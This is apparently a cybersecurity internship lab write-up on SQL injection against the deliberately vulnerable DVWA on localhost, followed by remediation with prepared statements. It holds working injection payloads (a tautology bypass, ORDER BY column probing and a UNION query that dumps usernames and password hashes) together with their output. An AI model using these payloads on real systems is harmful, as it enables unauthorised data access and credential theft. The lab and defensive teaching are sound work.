# Task 3: SQL Injection Lab Notes & Remediation

**Author**: Gyandeep Duwarah  
**Internship**: Oasis Infobyte (OIBSIP) — Cybersecurity Track  
**Lab Target**: Damn Vulnerable Web Application (DVWA) - Low Security  
**Module**: SQL Injection (`/vulnerabilities/sqli/`)  

---

## 1. Vulnerability Overview & Architecture

### What is SQL Injection (SQLi)?
SQL Injection occurs when untrusted user input is directly concatenated into a dynamic database query string without proper sanitization, escaping, or parameterization. This architectural flaw allows an attacker to manipulate the structure and logic of the SQL statement processed by the backend database interpreter (e.g., MySQL / MariaDB).

### Root Cause Analysis in DVWA (Low Security Level)
Below is the actual PHP source code extracted from the local DVWA backend (`vulnerabilities/sqli/source/low.php`):

```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input directly from user request
    $id = $_REQUEST[ 'id' ];

    // VULNERABILITY: Raw input $id is directly concatenated into SQL query string
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Fetch and display results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
}
?>
```

### The Architectural Flaw
1. The developer enclosed `$id` inside single quotes: `' $id '`.
2. No input validation is performed (e.g., checking if `$id` is strictly an integer using `is_numeric()` or `ctype_digit()`).
3. No escaping function (such as `mysqli_real_escape_string()`) is used.
4. Critically, **dynamic string concatenation** is employed instead of a **parameterized prepared statement**.

---

## 2. Baseline: Normal Application Behavior

Before conducting vulnerability testing, the legitimate application workflow must be recorded to establish normal behavior.

### Legitimate Input
- **Action**: In the "User ID" search box, enter: `1`
- **HTTP Request**:
  ```http
  GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
  Host: localhost:8080
  ```
- **Backend Query Executed**:
  ```sql
  SELECT first_name, last_name FROM users WHERE user_id = '1';
  ```
- **Observed Web Output**:
  ```text
  ID: 1
  First name: admin
  Surname: admin
  ```
- **Analysis**: The application looks up the specific user row where `user_id = 1` and returns the legitimate administrator account name.

---

## 3. Controlled Exploit Test 1: Boolean Tautology Injection

### Objective
Bypass the intended `WHERE` clause constraint to force the database to evaluate the condition to `TRUE` for every record, dumping all users stored in the database table.

### Test Input Payload
```text
1' OR '1'='1
```
*(Or with SQL comment: `1' OR '1'='1 #`)*

### Backend Query Construction
When the raw payload is substituted into the PHP string:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

### Parser Breakdown
1. `1'` closes the opening single quote intended for the `user_id` value.
2. `OR '1'='1'` injects a logical `OR` condition that always evaluates to boolean `TRUE`.
3. The trailing single quote provided by the developer's original string (`';`) matches the final `'` of our payload (`'1'`), maintaining valid SQL syntax.
4. Because `'1'='1'` is perpetually true, the database returns every row in the `users` table regardless of `user_id`.

### Observed Application Output
```text
ID: 1' OR '1'='1
First name: admin
Surname: admin

ID: 1' OR '1'='1
First name: Gordon
Surname: Brown

ID: 1' OR '1'='1
First name: Hack
Surname: ME

ID: 1' OR '1'='1
First name: Pablo
Surname: Picasso

ID: 1' OR '1'='1
First name: Bob
Surname: Smith
```

### Finding
The query successfully bypassed filtering logic, extracting all user identities in the database.

---

## 4. Controlled Exploit Test 2: UNION-Based Schema & Data Extraction

### Objective
Leverage the SQL `UNION` operator to append results from a secondary query, extracting arbitrary sensitive columns (such as usernames and hashed passwords) from the internal `users` table.

### Step 2A: Determining Column Count
To perform a `UNION` injection, the injected query must return the exact same number of columns as the primary query (which selects two columns: `first_name, last_name`).
We test using `ORDER BY`:
```text
1' ORDER BY 1 #   --> Returns normal result (at least 1 column exists)
1' ORDER BY 2 #   --> Returns normal result (at least 2 columns exist)
1' ORDER BY 3 #   --> Returns SQL error: "Unknown column '3' in 'order clause'"
```
*Conclusion: The original query retrieves exactly 2 columns.*

### Step 2B: Injected Payload
```text
1' UNION SELECT user, password FROM users #
```

### Backend Query Construction
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users #';
```

### Parser Breakdown
1. `1'` terminates the initial user ID literal.
2. `UNION SELECT user, password FROM users` executes a secondary query against the `users` table, projecting the `user` column into `First name` and the `password` hash column into `Surname`.
3. `#` (hash character in MySQL) instructs the SQL parser to treat the remainder of the developer's original query (the closing quote and semicolon) as a comment, preventing syntax parsing errors.

### Observed Application Output
```text
ID: 1' UNION SELECT user, password FROM users #
First name: admin
Surname: admin

ID: 1' UNION SELECT user, password FROM users #
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' UNION SELECT user, password FROM users #
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' UNION SELECT user, password FROM users #
First name: 1337
Surname: 8d3b75712f174179e8607066e4a07865

ID: 1' UNION SELECT user, password FROM users #
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' UNION SELECT user, password FROM users #
First name: bsmith
Surname: 21232f297a57a5a743894a0e4a801fc3
```

### Finding
The attacker extracts all user credentials and cryptographic password hashes directly from the web interface.

---

## 5. Defensive Engineering & Remediation

### Primary Fix: Parameterized Queries (Prepared Statements)
The only robust, definitive architectural defense against SQL Injection is **separation of code from data** via **Prepared Statements and Parameterized Queries**.

#### How Parameterization Works
1. **Compilation Phase**: The application sends the SQL query template to the database server with placeholders (e.g., `?` or `:id`) before user input is touched. The database parses, compiles, and optimizes the SQL execution plan:
   ```sql
   SELECT first_name, last_name FROM users WHERE user_id = ?;
   ```
2. **Execution Phase**: The user-supplied input is transmitted separately. The database treats the supplied parameter purely as a literal data value (string/integer), never as executable SQL instructions. Even if the user enters `' OR '1'='1`, the database literally searches for a user whose ID equals the entire string `"1' OR '1'='1"`, resulting in zero records found and zero execution alteration.

### Side-by-Side Code Comparison

#### Insecure Code (Vulnerable PHP / MySQLi)
```php
// INSECURE: Directly concatenating input into SQL command
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($conn, $query);
```

#### Secure Code (PHP PDO with Prepared Statements)
```php
<?php
// SECURE: Utilizing PHP Data Objects (PDO) with parameter binding
$id = $_GET['id'];

// 1. Prepare SQL template with a positional parameter placeholder
$stmt = $pdo->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id');

// 2. Bind the user input explicitly with data type enforcement
$stmt->bindValue(':id', $id, PDO::PARAM_INT);

// 3. Execute the pre-compiled statement safely
$stmt->execute();

// 4. Fetch the result set
$results = $stmt->fetchAll(PDO::FETCH_ASSOC);
foreach ($results as $row) {
    echo "First name: " . htmlspecialchars($row['first_name'], ENT_QUOTES, 'UTF-8') . "<br />";
    echo "Surname: " . htmlspecialchars($row['last_name'], ENT_QUOTES, 'UTF-8') . "<br />";
}
?>
```

### Secondary Defense-in-Depth Controls
1. **Input Validation & Whitelisting**: Verify that incoming parameters conform strictly to expected data types (e.g., `filter_var($id, FILTER_VALIDATE_INT)`). If input is not an integer, reject the request immediately.
2. **Principle of Least Privilege**: Ensure the database user account used by the web application only possesses `SELECT, INSERT, UPDATE` privileges on the necessary application tables. It must not have administrative privileges (`DROP, GRANT, FILE, EXECUTE`).
3. **Web Application Firewall (WAF)**: Deploy a WAF (such as ModSecurity or AWS WAF) at the perimeter to inspect HTTP requests for common SQL injection patterns and block anomalous payloads before they reach application code.
